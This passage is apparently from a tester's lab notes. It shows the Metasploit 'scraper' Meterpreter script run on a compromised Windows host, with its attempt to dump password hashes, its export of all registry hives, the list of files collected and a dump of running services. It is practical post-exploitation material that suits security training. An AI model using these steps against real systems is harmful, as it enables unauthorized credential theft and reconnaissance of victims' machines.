- The scraper Meterpreter script can dig out lots of information about the compromised target, such as registry information, password hashes, and network information, and store it locally on the tester's machine.
```python
meterpreter > run scraper
[*] New session on 192.168.216.11:445...
[*] Gathering basic system information...
[*] Error dumping hashes: Rex::Post::Meterpreter::RequestError priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.
[*] Obtaining the entire registry...
[*]  Exporting HKCU
[*]  Downloading HKCU (C:\Windows\TEMP\hpdsqAow.reg)
[*]  Cleaning HKCU
[*]  Exporting HKLM
[*]  Downloading HKLM (C:\Windows\TEMP\TDpXhUwR.reg)
[*]  Cleaning HKLM
[*]  Exporting HKCC
[*]  Downloading HKCC (C:\Windows\TEMP\KTLEIZRO.reg)
[*]  Cleaning HKCC
[*]  Exporting HKCR
[*]  Downloading HKCR (C:\Windows\TEMP\lVxOkQWL.reg)
[*]  Cleaning HKCR
[*]  Exporting HKU
[*]  Downloading HKU (C:\Windows\TEMP\illafuaE.reg)
[*]  Cleaning HKU
[*] Completed processing on 192.168.216.11:445...
```
## You can find extracted files there --> "/root/.msf4/logs/scripts/scraper/"
```python
┌──(hyok㉿kali)-[~/Templates]
└─$ sudo ls -la  /root/.msf4/logs/scripts/scraper/                            
total 24
drwxr-xr-x 6 root root 4096 Mar 16 13:21 .
drwxr-xr-x 3 root root 4096 Mar 16 12:42 ..
drwxr-xr-x 2 root root 4096 Mar 16 13:23 192.168.216.11_20230316.212655265
drwxr-xr-x 2 root root 4096 Mar 16 12:43 192.168.216.11_20230316.425646818
drwxr-xr-x 2 root root 4096 Mar 16 12:48 192.168.216.11_20230316.482329336
drwxr-xr-x 2 root root 4096 Mar 16 12:51 192.168.216.11_20230316.493126899
                                                                                                                                        
┌──(hyok㉿kali)-[~/Templates]
└─$ sudo ls -la  /root/.msf4/logs/scripts/scraper/192.168.216.11_20230316.212655265
total 170184
drwxr-xr-x 2 root root      4096 Mar 16 13:23 .
drwxr-xr-x 6 root root      4096 Mar 16 13:21 ..
-rw-r--r-- 1 root root      1867 Mar 16 13:21 env.txt
-rw-r--r-- 1 root root       119 Mar 16 13:21 group.txt
-rw-r--r-- 1 root root     10350 Mar 16 13:23 HKCC.reg
-rw-r--r-- 1 root root  24725116 Mar 16 13:23 HKCR.reg
-rw-r--r-- 1 root root    125396 Mar 16 13:21 HKCU.reg
-rw-r--r-- 1 root root 138980660 Mar 16 13:21 HKLM.reg
-rw-r--r-- 1 root root  10348694 Mar 16 13:23 HKU.reg
-rw-r--r-- 1 root root       117 Mar 16 13:21 localgroup.txt
-rw-r--r-- 1 root root       104 Mar 16 13:21 nethood.txt
-rw-r--r-- 1 root root     19817 Mar 16 13:21 network.txt
-rw-r--r-- 1 root root      1868 Mar 16 13:21 services.txt
-rw-r--r-- 1 root root       420 Mar 16 13:21 shares.txt
-rw-r--r-- 1 root root      2251 Mar 16 13:21 systeminfo.txt
-rw-r--r-- 1 root root        79 Mar 16 13:21 system.txt
-rw-r--r-- 1 root root       671 Mar 16 13:21 users.txt
```

## Output to one of files inside the above folder:
```python
┌──(hyok㉿kali)-[~/Templates]
└─$ sudo cat /root/.msf4/logs/scripts/scraper/192.168.216.11_20230316.212655265/services.txt
These Windows services are started:

   Apache Tomcat 8.0 Tomcat8
   Application Experience
   Application Host Helper Service
   Base Filtering Engine
   Certificate Propagation
   COM+ Event System
   Cryptographic Services
   DCOM Server Process Launcher
   Desktop Window Manager Session Manager
   DHCP Client
   Diagnostic Policy Service
   Diagnostic System Host
   Distributed Link Tracking Client
   Distributed Transaction Coordinator
   DNS Client
   domain1 GlassFish Server
   Elasticsearch 1.1.1 (elasticsearch-service-x64)
   Group Policy Client
   IKE and AuthIP IPsec Keying Modules
   IP Helper
   IPsec Policy Agent
   jenkins
   jmx
   ManageEngine Desktop Central Server
   MEDC Server Component - Apache
   MEDC Server Component - Notification Server
   Microsoft FTP Service
   Network Connections
   Network List Service
   Network Location Awareness
   Network Store Interface Service
   OpenSSH Server
   Plug and Play
   Power
   Print Spooler
   Remote Desktop Configuration
   Remote Desktop Services
   Remote Desktop Services UserMode Port Redirector
   Remote Procedure Call (RPC)
   Remote Registry
   RPC Endpoint Mapper
   Security Accounts Manager
   Server
   Shell Hardware Detection
   SNMP Service
   Software Protection
   SPP Notification Service
   System Event Notification Service
   Task Scheduler
   TCP/IP NetBIOS Helper
   User Profile Service
   VirtualBox Guest Additions Service
   wampapache
   wampmysqld
   Windows Event Log
   Windows Firewall
   Windows Font Cache Service
   Windows Licensing Monitoring Service
   Windows Management Instrumentation
   Windows Process Activation Service
   Windows Remote Management (WS-Management)
   Windows Update
   Workstation
   World Wide Web Publishing Service

The command completed successfully.
```
Note - The source code for scraper.rb is present under /usr/share/metasploitframework/scripts/meterpreter.